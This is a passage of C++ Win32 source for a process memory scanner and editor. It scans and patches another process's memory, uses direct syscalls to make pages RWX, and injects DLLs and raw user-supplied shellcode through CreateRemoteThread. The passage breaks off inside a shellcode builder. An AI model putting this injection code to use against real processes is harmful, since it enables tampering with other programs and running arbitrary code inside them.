        int needed = MultiByteToWideChar(CP_UTF8,0,txt,-1,NULL,0);
        if (needed <= 0){LogToStatus("Conversion failed",true);return;}
        wide.assign(needed,0);
        MultiByteToWideChar(CP_UTF8,0,txt,-1,wide.data(),needed);
        writeLen = (SIZE_T)needed * sizeof(wchar_t);
    }
    if (protect) {
        if (useSyscall) {
            if (!SyscallProtectVirtualMemory(hProcess,address,writeLen,PAGE_EXECUTE_READWRITE,&oldProt)){
                LogToStatus("Unable to change protection via syscall",true);return;
            }
        } else {
            if (!VirtualProtectEx(hProcess,address,writeLen,PAGE_EXECUTE_READWRITE,&oldProt)){
                LogToStatus("Unable to change protection",true);return;
            }
        }
    }

    if(!utf16){
        SIZE_T len=strlen(txt)+1;
        SIZE_T w;
        bool ok = useSyscall ? SyscallWriteVirtualMemory(hProcess,address,txt,len,&w)
                             : WriteProcessMemory(hProcess,address,txt,len,&w);
        if(ok){
            char buf[256];sprintf_s(buf,"Wrote UTF-8 string (%zu bytes) to 0x%p%s",len,address,useSyscall?" (syscall)":"");
            LogToStatus(buf);ShowHexAtAddress(address,address);
        }else LogToStatus("Write failed",true);
    }else{
        SIZE_T w;
        bool ok = useSyscall ? SyscallWriteVirtualMemory(hProcess,address,wide.data(),writeLen,&w)
                             : WriteProcessMemory(hProcess,address,wide.data(),writeLen,&w);
        if(ok){
            char buf[256];sprintf_s(buf,"Wrote UTF-16LE string (%zu bytes) to 0x%p%s",writeLen,address,useSyscall?" (syscall)":"");
            LogToStatus(buf);ShowHexAtAddress(address,address);
        }else LogToStatus("Write failed",true);
    }
    if (protect && oldProt) {
        if (useSyscall) SyscallProtectVirtualMemory(hProcess,address,writeLen,oldProt,nullptr);
        else VirtualProtectEx(hProcess,address,writeLen,oldProt,&oldProt);
    }
}

void DoAobPatchReplace(){
    if(!hProcess){LogToStatus("No process attached!",true);return;}
    char findBuf[512]={},replBuf[512]={};
    GetWindowTextA(hEditAobPatchFind,findBuf,512);
    GetWindowTextA(hEditAobPatchRepl,replBuf,512);

    std::vector<BYTE> findBytes,replBytes;
    std::vector<bool> findMask,replMask;
    if(!ParseAOB(findBuf,findBytes,findMask)||findBytes.empty()){
        LogToStatus("Invalid Find pattern",true);return;}
    if(!ParseAOB(replBuf,replBytes,replMask)||replBytes.empty()){
        LogToStatus("Invalid Replace pattern",true);return;}
    if(replBytes.size()<findBytes.size()){
       
        while(replBytes.size()<findBytes.size()){replBytes.push_back(0x90);replMask.push_back(false);}
    }

    SYSTEM_INFO si;GetSystemInfo(&si);
    LPVOID addr=si.lpMinimumApplicationAddress;
    int patched=0;
    size_t plen=findBytes.size();

    while(addr<si.lpMaximumApplicationAddress){
        MEMORY_BASIC_INFORMATION mbi;
        if(VirtualQueryEx(hProcess,addr,&mbi,sizeof(mbi))!=sizeof(mbi))break;
        if(mbi.State==MEM_COMMIT&&
           (mbi.Protect&(PAGE_READWRITE|PAGE_EXECUTE_READWRITE|PAGE_WRITECOPY))&&
           !(mbi.Protect&PAGE_GUARD)){
            SIZE_T chunkSz=std::min(mbi.RegionSize,(SIZE_T)(2*1024*1024));
            std::vector<BYTE> chunk(chunkSz);SIZE_T r;
            if(ReadProcessMemory(hProcess,mbi.BaseAddress,chunk.data(),chunkSz,&r)&&r>0){
                for(SIZE_T i=0;i+plen<=r;i++){
                    bool match=true;
                    for(size_t k=0;k<plen;k++)if(!findMask[k]&&chunk[i+k]!=findBytes[k]){match=false;break;}
                    if(match){
                        LPVOID fa=(LPVOID)((uintptr_t)mbi.BaseAddress+i);
                        SIZE_T w;
                        WriteProcessMemory(hProcess,fa,replBytes.data(),replBytes.size(),&w);
                        patched++;
                        char log[256];sprintf_s(log,"Patched @ 0x%p",fa);
                        AppendEditText(hScanResultsWnd,log);
                    }
                }
            }
        }
        addr=(LPVOID)((uintptr_t)mbi.BaseAddress+mbi.RegionSize);
    }
    char buf[128];sprintf_s(buf,"AOB Patch: replaced %d occurrence(s)",patched);
    LogToStatus(buf);
}


void ShowHexAtAddress(LPVOID address,LPVOID highlightAddr){
    if(!hProcess){LogToStatus("No process attached!",true);return;}
    ClearEditText(hHexViewWnd);
    BYTE data[512];SIZE_T r;
    if(!ReadProcessMemory(hProcess,address,data,sizeof(data),&r)){
        LogToStatus("Failed to read memory at address",true);return;
    }
    char hdr[256];
    sprintf_s(hdr,"Hex dump @ 0x%p  (%zu bytes)  [SELECT TEXT BELOW TO COPY]",address,r);
    AppendEditText(hHexViewWnd,hdr);
    AppendEditText(hHexViewWnd,"Offset   | 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F | ASCII");
    AppendEditText(hHexViewWnd,"---------+-------------------------------------------------+-----------------");

    for(int i=0;i<(int)r;i+=16){
        char line[256]={};char asc[20]={};
        sprintf_s(line,"%08X | ",(DWORD)((uintptr_t)address+i));
        for(int j=0;j<16;j++){
            if(i+j<(int)r){char h[4];sprintf_s(h,"%02X ",data[i+j]);strcat_s(line,h);
                asc[j]=(data[i+j]>=32&&data[i+j]<127)?(char)data[i+j]:'.';}
            else{strcat_s(line,"   ");asc[j]=' ';}
        }
        asc[16]=0;strcat_s(line,"| ");strcat_s(line,asc);
        if(highlightAddr){
            uintptr_t rs=(uintptr_t)address+i,ha=(uintptr_t)highlightAddr;
            if(ha>=rs&&ha<rs+16){
                int byteOff=(int)(ha-rs),hval=0;
                if(byteOff+4<=(int)r-i)hval=*(int*)(&data[i+byteOff]);
                char marker[80];sprintf_s(marker,"  <<<< byte+0x%02X  int32=%d  >>>>",byteOff,hval);
                strcat_s(line,marker);
            }
        }
        AppendEditText(hHexViewWnd,line);
    }
    AppendEditText(hHexViewWnd,"");
    int32_t vi=*(int32_t*)data;int16_t vs=*(int16_t*)data;
    float vf=*(float*)data;double vd=*(double*)data;
    char interp[256];
    sprintf_s(interp,"int32=%d  |  int16=%d  |  float=%.4f  |  double=%.6f  (@ base addr)",vi,vs,vf,vd);
    AppendEditText(hHexViewWnd,interp);

    
    char utf8prev[96]="UTF-8 preview: \"";
    int pl=(int)strlen(utf8prev);
    for(int i=0;i<32&&i<(int)r;i++){
        char c=data[i];if(c==0)break;
        if(c>=' '&&c<127)utf8prev[pl++]=c;else{char e[6];sprintf_s(e,"\\x%02X",data[i]);for(int k=0;e[k];k++)utf8prev[pl++]=e[k];}
    }
    utf8prev[pl++]='"';utf8prev[pl]=0;
    AppendEditText(hHexViewWnd,utf8prev);

  
    char utf16prev[96]="UTF-16 preview: \"";
    int ul=(int)strlen(utf16prev);
    for(int i=0;i+1<(int)r&&i<62;i+=2){
        wchar_t wc=*(wchar_t*)&data[i];if(wc==0)break;
        if(wc>=' '&&wc<127)utf16prev[ul++]=(char)wc;
        else{char e[8];sprintf_s(e,"\\u%04X",wc);for(int k=0;e[k];k++)utf16prev[ul++]=e[k];}
    }
    utf16prev[ul++]='"';utf16prev[ul]=0;
    AppendEditText(hHexViewWnd,utf16prev);

    char hexAddr[32];sprintf_s(hexAddr,"0x%p",address);
    SetWindowTextA(hEditHexAddress,hexAddr);
    LogToStatus("Hex view updated - click in panel and Ctrl+A to select all, Ctrl+C to copy");
}

void PopulateModuleList(){
    ClearEditText(hLstModules);
    if(!hProcess)return;
    HMODULE mods[512];DWORD needed;
    AppendEditText(hLstModules,"Module Name              | Base Address        | Size       | Entry Point");
    AppendEditText(hLstModules,"-------------------------+---------------------+------------+--------------------");
    if(!EnumProcessModules(hProcess,mods,sizeof(mods),&needed))return;
    DWORD count=needed/sizeof(HMODULE);
    for(DWORD i=0;i<count&&i<512;i++){
        char modPath[MAX_PATH]={};
        GetModuleFileNameExA(hProcess,mods[i],modPath,MAX_PATH);
        const char* modName=strrchr(modPath,'\\');if(modName)modName++;else modName=modPath;
        MODULEINFO mi={};GetModuleInformation(hProcess,mods[i],&mi,sizeof(mi));
        char line[512];
        sprintf_s(line,"%-24s | 0x%016llX | %10s | 0x%p",
            modName,(unsigned long long)(uintptr_t)mi.lpBaseOfDll,
            FormatMemorySize(mi.SizeOfImage).c_str(),mi.EntryPoint);
        AppendEditText(hLstModules,line);
    }
}

void RefreshWatchList(){
    if(!hProcess||watchList.empty())return;
    ClearEditText(hLstWatchList);
    LPVOID base=GetBaseAddress();
    for(int i=0;i<(int)watchList.size();i++){
        LPVOID a=watchList[i];
        int v=ReadValueFromAddress(a);
        float vf=0.0f;ReadProcessMemory(hProcess,a,&vf,4,nullptr);
        LONGLONG off=base?((LONGLONG)(uintptr_t)a-(LONGLONG)(uintptr_t)base):0;
        char entry[512];
        sprintf_s(entry,"[%02d]  0x%p  +0x%llX  =  %d  (%.4f)",i,a,off,v,vf);
        AppendEditText(hLstWatchList,entry);
    }
}

void ExportScanResults(){
    if(scanResults.empty()){LogToStatus("No results to export",true);return;}
    char filename[MAX_PATH]="scan_results.txt";
    OPENFILENAMEA ofn={};ofn.lStructSize=sizeof(ofn);ofn.hwndOwner=hMainWnd;
    ofn.lpstrFile=filename;ofn.nMaxFile=MAX_PATH;
    ofn.lpstrFilter="Text Files\0*.txt\0All Files\0*.*\0";ofn.lpstrDefExt="txt";
    ofn.Flags=OFN_OVERWRITEPROMPT;
    if(!GetSaveFileNameA(&ofn))return;
    FILE* f=nullptr;fopen_s(&f,filename,"w");
    if(!f){LogToStatus("Could not open file for export",true);return;}
    LPVOID base=GetBaseAddress();
    SYSTEMTIME st;GetLocalTime(&st);
    fprintf(f,"MEMISCANI Scan Results Export\n");
    fprintf(f,"Date: %04d-%02d-%02d %02d:%02d:%02d\n",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);
    fprintf(f,"PID: %d  Base: 0x%p  Results: %zu\n\n",currentPID,base,scanResults.size());
    int dt=(int)SendMessage(hCmbDataType,CB_GETCURSEL,0,0);
    for(LPVOID a:scanResults){
        BYTE buf[8]={};SIZE_T r;
        ReadProcessMemory(hProcess,a,buf,GetDataTypeSize(dt),&r);
        LONGLONG off=base?((LONGLONG)(uintptr_t)a-(LONGLONG)(uintptr_t)base):0;
        fprintf(f,"0x%p  Offset: +0x%llX  Value: %s\n",a,off,FormatTypedValue(buf,dt).c_str());
    }
    fclose(f);
    char msg[256];sprintf_s(msg,"Exported %zu results to %s",scanResults.size(),filename);
    LogToStatus(msg);
}

void DoFirstScan(){
    if(!hProcess){LogToStatus("No process attached!",true);return;}
    int dt=(int)SendMessage(hCmbDataType,CB_GETCURSEL,0,0);
    int sc=(int)SendMessage(hCmbScanType,CB_GETCURSEL,0,0);
    if(dt<0)dt=DT_INT32;if(sc<0)sc=SC_EXACT;
    char valueStr[128];GetWindowTextA(hEditScanValue,valueStr,128);
    char logBuf[256];sprintf_s(logBuf,"First scan: type=%d cond=%d value='%s' ...",dt,sc,valueStr);
    LogToStatus(logBuf);
    ClearEditText(hScanResultsWnd);
    scanResults.clear();scanPrevVals.clear();

    LPVOID base=GetBaseAddress();
    SYSTEM_INFO si;GetSystemInfo(&si);
    LPVOID addr=si.lpMinimumApplicationAddress;
    int found=0;
    const int MAX_RESULTS=100000;

    std::vector<BYTE> aobBytes;std::vector<bool> aobMask;
    if(dt==DT_AOB&&!ParseAOB(valueStr,aobBytes,aobMask)){
        LogToStatus("Invalid AOB pattern. Use: 48 8B 05 ?? ?? ??",true);return;
    }

    BYTE targetBuf[8]={};
    size_t valSz=GetDataTypeSize(dt);
    if(sc==SC_EXACT&&dt!=DT_STRING&&dt!=DT_AOB){
        if(dt==DT_FLOAT){float v=(float)atof(valueStr);memcpy(targetBuf,&v,4);}
        else if(dt==DT_DOUBLE){double v=atof(valueStr);memcpy(targetBuf,&v,8);}
        else if(dt==DT_INT64){int64_t v=_strtoi64(valueStr,NULL,10);memcpy(targetBuf,&v,8);}
        else{int32_t v=atoi(valueStr);
            if(dt==DT_INT8){int8_t b=(int8_t)v;memcpy(targetBuf,&b,1);}
            else if(dt==DT_INT16){int16_t b=(int16_t)v;memcpy(targetBuf,&b,2);}
            else memcpy(targetBuf,&v,4);
        }
    }

    while(addr<si.lpMaximumApplicationAddress&&found<MAX_RESULTS){
        MEMORY_BASIC_INFORMATION mbi;
        if(VirtualQueryEx(hProcess,addr,&mbi,sizeof(mbi))!=sizeof(mbi))break;
        if(mbi.State==MEM_COMMIT&&
           (mbi.Protect&(PAGE_READWRITE|PAGE_WRITECOPY|PAGE_EXECUTE_READWRITE|PAGE_READONLY|PAGE_EXECUTE_READ))&&
           !(mbi.Protect&PAGE_GUARD)){
            SIZE_T chunkSz=std::min(mbi.RegionSize,(SIZE_T)(4*1024*1024));
            std::vector<BYTE> chunk(chunkSz);SIZE_T r;
            if(ReadProcessMemory(hProcess,mbi.BaseAddress,chunk.data(),chunkSz,&r)&&r>0){
                if(dt==DT_STRING){
                    size_t slen=strlen(valueStr);if(slen==0)goto nextRegion;
                    for(SIZE_T i=0;i+slen<=r&&found<MAX_RESULTS;i++){
                        if(memcmp(&chunk[i],valueStr,slen)==0){
                            LPVOID fa=(LPVOID)((uintptr_t)mbi.BaseAddress+i);
                            scanResults.push_back(fa);
                            std::vector<BYTE> pv(chunk.begin()+i,chunk.begin()+i+slen);
                            scanPrevVals.push_back(pv);
                            LONGLONG off=base?((LONGLONG)(uintptr_t)fa-(LONGLONG)(uintptr_t)base):0;
                            char entry[512];sprintf_s(entry,"0x%p  |  Offset: +0x%llX  |  String: \"%s\"",fa,off,valueStr);
                            AppendEditText(hScanResultsWnd,entry);found++;
                        }
                    }
                }else if(dt==DT_AOB){
                    size_t plen=aobBytes.size();
                    for(SIZE_T i=0;i+plen<=r&&found<MAX_RESULTS;i++){
                        bool match=true;
                        for(size_t k=0;k<plen;k++)if(!aobMask[k]&&chunk[i+k]!=aobBytes[k]){match=false;break;}
                        if(match){
                            LPVOID fa=(LPVOID)((uintptr_t)mbi.BaseAddress+i);
                            scanResults.push_back(fa);
                            std::vector<BYTE> pv(chunk.begin()+i,chunk.begin()+i+plen);
                            scanPrevVals.push_back(pv);
                            LONGLONG off=base?((LONGLONG)(uintptr_t)fa-(LONGLONG)(uintptr_t)base):0;
                            char entry[512];sprintf_s(entry,"0x%p  |  Offset: +0x%llX  |  AOB match (%zu bytes)",fa,off,plen);
                            AppendEditText(hScanResultsWnd,entry);found++;
                        }
                    }
                }else{
                    for(SIZE_T i=0;i+valSz<=r&&found<MAX_RESULTS;i+=valSz){
                        const BYTE* cur=&chunk[i];
                        bool hit=(sc==SC_EXACT)?MatchesCondition(cur,nullptr,targetBuf,dt,sc,valSz):true;
                        if(hit){
                            LPVOID fa=(LPVOID)((uintptr_t)mbi.BaseAddress+i);
                            scanResults.push_back(fa);
                            std::vector<BYTE> pv(cur,cur+valSz);
                            scanPrevVals.push_back(pv);
                            if(sc==SC_EXACT){
                                LONGLONG off=base?((LONGLONG)(uintptr_t)fa-(LONGLONG)(uintptr_t)base):0;
                                char entry[512];sprintf_s(entry,"0x%p  |  Offset: +0x%llX  |  Value: %s",fa,off,FormatTypedValue(cur,dt).c_str());
                                AppendEditText(hScanResultsWnd,entry);
                            }
                            found++;
                        }
                    }
                }
            }
        }
        nextRegion:
        addr=(LPVOID)((uintptr_t)mbi.BaseAddress+mbi.RegionSize);
    }

    if(sc!=SC_EXACT&&dt!=DT_STRING&&dt!=DT_AOB){
        char buf[256];sprintf_s(buf,"Baseline captured: %d address(es). Change value then click Next Scan.",found);
        LogToStatus(buf);
        AppendEditText(hScanResultsWnd,"[Baseline captured - change value in target and click Next Scan]");
    }else{
        char buf[256];sprintf_s(buf,"Found %d match(es)",found);
        LogToStatus(buf);
    }
    ShowMemoryMap();UpdateScanCount();
}

void DoNextScan(){
    if(scanResults.empty()){LogToStatus("No previous scan - use First Scan first",true);return;}
    int dt=(int)SendMessage(hCmbDataType,CB_GETCURSEL,0,0);
    int sc=(int)SendMessage(hCmbScanType,CB_GETCURSEL,0,0);
    if(dt<0)dt=DT_INT32;if(sc<0)sc=SC_EXACT;
    char valueStr[128];GetWindowTextA(hEditScanValue,valueStr,128);
    size_t valSz=GetDataTypeSize(dt);
    BYTE targetBuf[8]={};
    if(sc==SC_EXACT&&dt!=DT_STRING&&dt!=DT_AOB){
        if(dt==DT_FLOAT){float v=(float)atof(valueStr);memcpy(targetBuf,&v,4);}
        else if(dt==DT_DOUBLE){double v=atof(valueStr);memcpy(targetBuf,&v,8);}
        else if(dt==DT_INT64){int64_t v=_strtoi64(valueStr,NULL,10);memcpy(targetBuf,&v,8);}
        else{int32_t v=atoi(valueStr);
            if(dt==DT_INT8){int8_t b=(int8_t)v;memcpy(targetBuf,&b,1);}
            else if(dt==DT_INT16){int16_t b=(int16_t)v;memcpy(targetBuf,&b,2);}
            else memcpy(targetBuf,&v,4);
        }
    }
    std::vector<BYTE> aobBytes;std::vector<bool> aobMask;
    if(dt==DT_AOB)ParseAOB(valueStr,aobBytes,aobMask);
    LPVOID base=GetBaseAddress();
    std::vector<LPVOID> nextResults;
    std::vector<std::vector<BYTE>> nextPrev;
    ClearEditText(hScanResultsWnd);
    char logBuf[256];sprintf_s(logBuf,"Refining scan (cond=%d)...",sc);LogToStatus(logBuf);

    for(size_t i=0;i<scanResults.size();i++){
        LPVOID a=scanResults[i];BYTE cur[16]={};SIZE_T r;
        size_t readSz=(dt==DT_AOB&&!aobBytes.empty())?aobBytes.size():valSz;
        if(dt==DT_STRING)readSz=strlen(valueStr);
        if(!ReadProcessMemory(hProcess,a,cur,readSz,&r)||r<readSz)continue;
        const BYTE* prev=(!scanPrevVals.empty()&&i<scanPrevVals.size()&&!scanPrevVals[i].empty())?scanPrevVals[i].data():nullptr;
        bool hit=false;
        if(dt==DT_STRING)hit=(memcmp(cur,valueStr,readSz)==0);
        else if(dt==DT_AOB){hit=true;for(size_t k=0;k<aobBytes.size()&&hit;k++)if(!aobMask[k]&&cur[k]!=aobBytes[k])hit=false;}
        else hit=MatchesCondition(cur,prev,targetBuf,dt,sc,valSz);
        if(hit){
            nextResults.push_back(a);nextPrev.push_back(std::vector<BYTE>(cur,cur+readSz));
            LONGLONG off=base?((LONGLONG)(uintptr_t)a-(LONGLONG)(uintptr_t)base):0;
            char entry[512];sprintf_s(entry,"0x%p  |  Offset: +0x%llX  |  Value: %s",a,off,FormatTypedValue(cur,dt).c_str());
            AppendEditText(hScanResultsWnd,entry);
        }
    }
    scanResults=nextResults;scanPrevVals=nextPrev;
    char buf[128];sprintf_s(buf,"Refined to %zu match(es)",scanResults.size());
    LogToStatus(buf);ShowMemoryMap();UpdateScanCount();
}

void ScanForPointers(LPVOID targetAddr){
    if(!hProcess){LogToStatus("No process attached!",true);return;}
    char buf[256];sprintf_s(buf,"Pointer scan for addresses pointing to 0x%p ...",targetAddr);
    LogToStatus(buf);
    ClearEditText(hScanResultsWnd);
    scanResults.clear();scanPrevVals.clear();
    LPVOID base=GetBaseAddress();
    SYSTEM_INFO si;GetSystemInfo(&si);
    LPVOID addr=si.lpMinimumApplicationAddress;
    int found=0;uintptr_t target=(uintptr_t)targetAddr;size_t ptrSz=sizeof(uintptr_t);

    while(addr<si.lpMaximumApplicationAddress&&found<50000){
        MEMORY_BASIC_INFORMATION mbi;
        if(VirtualQueryEx(hProcess,addr,&mbi,sizeof(mbi))!=sizeof(mbi))break;
        if(mbi.State==MEM_COMMIT&&
           (mbi.Protect&(PAGE_READWRITE|PAGE_READONLY|PAGE_EXECUTE_READWRITE))&&
           !(mbi.Protect&PAGE_GUARD)){
            SIZE_T chunkSz=std::min(mbi.RegionSize,(SIZE_T)(2*1024*1024));
            std::vector<BYTE> chunk(chunkSz);SIZE_T r;
            if(ReadProcessMemory(hProcess,mbi.BaseAddress,chunk.data(),chunkSz,&r)){
                for(SIZE_T i=0;i+ptrSz<=r&&found<50000;i+=ptrSz){
                    uintptr_t val;memcpy(&val,&chunk[i],ptrSz);
                    if(val>=target&&val<=target+4096){
                        LPVOID fa=(LPVOID)((uintptr_t)mbi.BaseAddress+i);
                        scanResults.push_back(fa);
                        LONGLONG off=base?((LONGLONG)(uintptr_t)fa-(LONGLONG)(uintptr_t)base):0;
                        char entry[512];
                        sprintf_s(entry,"0x%p  |  Offset: +0x%llX  |  Points to: 0x%llX  (+0x%llX)",
                            fa,off,(LONGLONG)val,(LONGLONG)(val-target));
                        AppendEditText(hScanResultsWnd,entry);found++;
                    }
                }
            }
        }
        addr=(LPVOID)((uintptr_t)mbi.BaseAddress+mbi.RegionSize);
    }
    sprintf_s(buf,"Pointer scan: %d pointer(s) found",found);
    LogToStatus(buf);ShowMemoryMap();UpdateScanCount();
}

void ScanCodeCaves(){
    if(!hProcess){LogToStatus("No process attached!",true);return;}
    char szBuf[16]={};GetWindowTextA(hEditCaveSize,szBuf,16);
    int minSize=atoi(szBuf);if(minSize<4)minSize=32;
    ClearEditText(hLstCaves);
    char hdr[128];sprintf_s(hdr,"Code caves (min %d bytes of 0x00 or 0x90):",minSize);
    AppendEditText(hLstCaves,hdr);
    SYSTEM_INFO si;GetSystemInfo(&si);LPVOID addr=si.lpMinimumApplicationAddress;int found=0;
    while(addr<si.lpMaximumApplicationAddress){
        MEMORY_BASIC_INFORMATION mbi;
        if(VirtualQueryEx(hProcess,addr,&mbi,sizeof(mbi))!=sizeof(mbi))break;
        if(mbi.State==MEM_COMMIT&&
           (mbi.Protect&(PAGE_EXECUTE_READWRITE|PAGE_EXECUTE_READ|PAGE_READWRITE))&&
           !(mbi.Protect&PAGE_GUARD)){
            SIZE_T chunkSz=std::min(mbi.RegionSize,(SIZE_T)(1*1024*1024));
            std::vector<BYTE> chunk(chunkSz);SIZE_T r;
            if(ReadProcessMemory(hProcess,mbi.BaseAddress,chunk.data(),chunkSz,&r)&&r>0){
                int runStart=-1,runLen=0;
                for(int i=0;i<=(int)r;i++){
                    bool nullByte=(i<(int)r)&&(chunk[i]==0x00||chunk[i]==0x90);
                    if(nullByte){if(runStart<0){runStart=i;runLen=0;}runLen++;}
                    else{
                        if(runLen>=minSize){
                            LPVOID ca=(LPVOID)((uintptr_t)mbi.BaseAddress+runStart);
                            const char* prot=(mbi.Protect&PAGE_EXECUTE_READWRITE)?"RWX":
                                             (mbi.Protect&PAGE_EXECUTE_READ)?"R-X":"RW-";
                            const char* mtype=(mbi.Type==MEM_IMAGE)?"IMAGE":"PRIV";
                            char line[256];sprintf_s(line,"0x%p  size=%-6d  %s  %s",ca,runLen,prot,mtype);
                            AppendEditText(hLstCaves,line);found++;
                        }
                        runStart=-1;runLen=0;
                    }
                }
            }
        }
        addr=(LPVOID)((uintptr_t)mbi.BaseAddress+mbi.RegionSize);
    }
    char msg[128];sprintf_s(msg,"Code caves: %d found (min size %d)",found,minSize);
    LogToStatus(msg);
}

void ListRemoteThreads(){
    if(!currentPID){LogToStatus("No process attached!",true);return;}
    ClearEditText(hLstThreads);
    AppendEditText(hLstThreads,"TID          | Base Pri | Delta Pri | Start Address");
    AppendEditText(hLstThreads,"-------------+----------+-----------+--------------------");
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
    if(snap==INVALID_HANDLE_VALUE){LogToStatus("Thread snapshot failed",true);return;}
    THREADENTRY32 te;te.dwSize=sizeof(te);int count=0;
    if(Thread32First(snap,&te)){
        do{
            if(te.th32OwnerProcessID!=currentPID)continue;
            char startAddr[32]="N/A";
            HANDLE hTh=OpenThread(THREAD_QUERY_INFORMATION,FALSE,te.th32ThreadID);
            if(hTh){
                PVOID sa=NULL;
                typedef NTSTATUS(WINAPI*NtQIT)(HANDLE,int,PVOID,ULONG,PULONG);
                static NtQIT fn=(NtQIT)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQueryInformationThread");
                if(fn)fn(hTh,9,&sa,sizeof(sa),NULL);
                if(sa)sprintf_s(startAddr,"0x%p",sa);
                CloseHandle(hTh);
            }
            char line[256];
            sprintf_s(line,"TID: %-10lu | BasePri: %2d | DeltaPri: %+3d | %s",
                te.th32ThreadID,te.tpBasePri,te.tpDeltaPri,startAddr);
            AppendEditText(hLstThreads,line);count++;
        }while(Thread32Next(snap,&te));
    }
    CloseHandle(snap);
    char buf[128];sprintf_s(buf,"Found %d thread(s) in PID %d",count,currentPID);
    LogToStatus(buf);
}

void InjectDLL(){
    if(!hProcess){LogToStatus("No process attached!",true);return;}
    char dllPath[MAX_PATH]={};GetWindowTextA(hEditDllPath,dllPath,MAX_PATH);
    if(!dllPath[0]){LogToStatus("Enter a DLL path first",true);return;}
    char fullPath[MAX_PATH]={};GetFullPathNameA(dllPath,MAX_PATH,fullPath,nullptr);
    if(GetFileAttributesA(fullPath)==INVALID_FILE_ATTRIBUTES){
        char buf[512];sprintf_s(buf,"DLL file not found: %s",fullPath);LogToStatus(buf,true);return;
    }
    SIZE_T pathLen=strlen(fullPath)+1;
    LPVOID remoteMem=VirtualAllocEx(hProcess,nullptr,pathLen,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!remoteMem){char buf[128];sprintf_s(buf,"VirtualAllocEx failed: %lu",GetLastError());LogToStatus(buf,true);return;}
    SIZE_T written;
    if(!WriteProcessMemory(hProcess,remoteMem,fullPath,pathLen,&written)){
        VirtualFreeEx(hProcess,remoteMem,0,MEM_RELEASE);LogToStatus("WriteProcessMemory failed",true);return;
    }
    LPVOID loadLib=(LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"),"LoadLibraryA");
    HANDLE hThread=CreateRemoteThread(hProcess,nullptr,0,(LPTHREAD_START_ROUTINE)loadLib,remoteMem,0,nullptr);
    if(!hThread){char buf[128];sprintf_s(buf,"CreateRemoteThread failed: %lu",GetLastError());
        VirtualFreeEx(hProcess,remoteMem,0,MEM_RELEASE);LogToStatus(buf,true);return;}
    WaitForSingleObject(hThread,5000);
    DWORD exitCode=0;GetExitCodeThread(hThread,&exitCode);CloseHandle(hThread);
    VirtualFreeEx(hProcess,remoteMem,0,MEM_RELEASE);
    if(exitCode==0)LogToStatus("DLL inj: LoadLibrary returned NULL (check path/arch match)",true);
    else{char buf[512];sprintf_s(buf,"DLL injected: %s  (handle=0x%lX)",fullPath,exitCode);LogToStatus(buf);PopulateModuleList();}
}

void EjectDLL(){
    if(!hProcess){LogToStatus("No process attached!",true);return;}
    int selStart=0,selEnd=0;
    SendMessage(hLstModules,EM_GETSEL,(WPARAM)&selStart,(LPARAM)&selEnd);
    int lineIdx=(int)SendMessage(hLstModules,EM_LINEFROMCHAR,(WPARAM)selStart,0);
    int lineLen=(int)SendMessage(hLstModules,EM_LINELENGTH,(WPARAM)SendMessage(hLstModules,EM_LINEINDEX,(WPARAM)lineIdx,0),0);
    if(lineLen<=0||lineIdx<2){LogToStatus("Click on a module line first",true);return;}
    std::string lineBuf(lineLen+1,'\0');
    lineBuf[0]=(char)(lineLen&0xFF);lineBuf[1]=(char)((lineLen>>8)&0xFF);
    SendMessageA(hLstModules,EM_GETLINE,(WPARAM)lineIdx,(LPARAM)&lineBuf[0]);
    const char* p=strstr(lineBuf.c_str(),"0x");
    if(!p){LogToStatus("Could not parse module base address",true);return;}
    uintptr_t base=(uintptr_t)strtoull(p+2,nullptr,16);
    if(!base){LogToStatus("Invalid module address",true);return;}
    LPVOID freeLib=(LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"),"FreeLibrary");
    HANDLE hThread=CreateRemoteThread(hProcess,nullptr,0,(LPTHREAD_START_ROUTINE)freeLib,(LPVOID)base,0,nullptr);
    if(!hThread){char buf[128];sprintf_s(buf,"CreateRemoteThread (FreeLibrary) failed: %lu",GetLastError());LogToStatus(buf,true);return;}
    WaitForSingleObject(hThread,5000);DWORD ec=0;GetExitCodeThread(hThread,&ec);CloseHandle(hThread);
    char buf[256];sprintf_s(buf,"FreeLibrary on 0x%llX returned %lu",(unsigned long long)base,ec);
    LogToStatus(buf);PopulateModuleList();
}

void InjectShellcode(){
    if(!hProcess){LogToStatus("No process attached!",true);return;}
    char scText[4096]={};GetWindowTextA(hEditShellcode,scText,sizeof(scText));
    std::vector<BYTE> scBytes;std::vector<bool> scMask;
    if(!ParseAOB(scText,scBytes,scMask)||scBytes.empty()){
        LogToStatus("Invalid shellcode - enter as hex bytes: 90 90 C3 ...",true);return;}
    int protIdx=(int)SendMessage(hCmbMemProt,CB_GETCURSEL,0,0);
    DWORD prot=(protIdx==1)?PAGE_EXECUTE_READ:PAGE_EXECUTE_READWRITE;
    LPVOID remoteMem=VirtualAllocEx(hProcess,nullptr,scBytes.size(),MEM_COMMIT|MEM_RESERVE,prot);
    if(!remoteMem){char buf[128];sprintf_s(buf,"VirtualAllocEx failed: %lu",GetLastError());LogToStatus(buf,true);return;}
    SIZE_T written;
    if(!WriteProcessMemory(hProcess,remoteMem,scBytes.data(),scBytes.size(),&written)){
        VirtualFreeEx(hProcess,remoteMem,0,MEM_RELEASE);LogToStatus("WriteProcessMemory failed",true);return;}
    HANDLE hThread=CreateRemoteThread(hProcess,nullptr,0,(LPTHREAD_START_ROUTINE)remoteMem,nullptr,0,nullptr);
    if(!hThread){char buf[256];sprintf_s(buf,"CreateRemoteThread (shellcode) failed: %lu",GetLastError());
        LogToStatus(buf,true);return;}
    char buf[256];sprintf_s(buf,"Shellcode (%zu bytes) executing at 0x%p",scBytes.size(),remoteMem);
    LogToStatus(buf);CloseHandle(hThread);ShowHexAtAddress(remoteMem,remoteMem);
}

void BuildShellcode(){
    int arch=(int)SendMessage(hCmbArch,CB_GETCURSEL,0,0);
    int op  =(int)SendMessage(hCmbScOp, CB_GETCURSEL,0,0);
    char addrStr[64]={};GetWindowTextA(hEditScAddr,addrStr,64);
    char valStr[32]={};GetWindowTextA(hEditScVal,valStr,32);
    uintptr_t addr=(uintptr_t)strtoull(addrStr,nullptr,0);
    int val=atoi(valStr);
    BYTE b[64];int n=0;std::string result;

    if(op==4){
        int count=val>0?val:16;
